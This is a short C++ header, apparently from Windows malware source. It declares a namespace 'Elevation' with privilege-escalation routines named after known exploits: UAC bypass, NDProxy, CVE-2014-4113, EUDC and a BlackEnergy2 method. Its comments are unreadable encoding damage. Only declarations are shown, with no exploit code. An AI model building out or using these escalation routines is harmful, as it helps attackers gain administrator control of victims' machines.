#pragma once

//��������� ����������

namespace Elevation
{

//��������� ���� nameExe � ���� ��� ��������� �����
bool Sdrop( const char* nameExe );
bool NDProxy( DWORD pid = 0 );
bool PathRec();

//����� UAC ��� Win7
//����� ������ shellcode ��������� ����� �� ��������, ������� ���� ����������� ���, �� �� ��� ����� ����� ������ ����� ����������
//���� ��������
bool UACBypass( const char* engineDll, const char *commandLine, int method = 0 );
bool COM( const char* dllPath, const char* cmd );
//wait = true ���� ����� ��������� ���������� cmd
bool BlackEnergy2( const char* cmd, bool wait = false );

//�������� ����� �� ���������
bool EUDC();
bool CVE2014_4113();

}
